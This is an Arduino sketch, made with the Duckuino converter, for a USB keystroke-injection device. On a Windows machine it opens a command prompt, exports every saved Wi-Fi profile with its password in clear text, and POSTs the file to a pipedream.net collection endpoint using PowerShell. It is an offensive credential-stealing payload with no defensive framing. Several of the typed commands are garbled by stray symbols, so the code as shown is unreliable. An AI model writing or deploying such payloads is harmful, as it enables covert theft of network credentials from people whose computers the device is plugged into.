/**
 * Made with Duckuino, an open-source project.
 * Check the license at 'https://github.com/Dukweeno/Duckuino/blob/master/LICENSE'
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(250);
  Keyboard.print(F("cmd &k"));

  typeKey(KEY_RETURN);

  delay(500);
  Keyboard.print(F("cd %temp%"));

  typeKey(KEY_RETURN);

  delay(500);
  Keyboard.print(F("netsh wlan export profile key)clear"));

  typeKey(KEY_RETURN);

  delay(1000);
  typeKey(KEY_RETURN);

  Keyboard.print(F("copy Wi|.xml WIFI.txt"));

  typeKey(KEY_RETURN);

  delay(1000);
  Keyboard.print(F("powershell Invoke/WebRequest /Uri https>&&eotrzqsgxfqspbn.m.pipedream.net /Method POST /InFile WIFI.txt"));

  typeKey(KEY_RETURN);

  delay(2000);
  Keyboard.print(F("exit"));

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
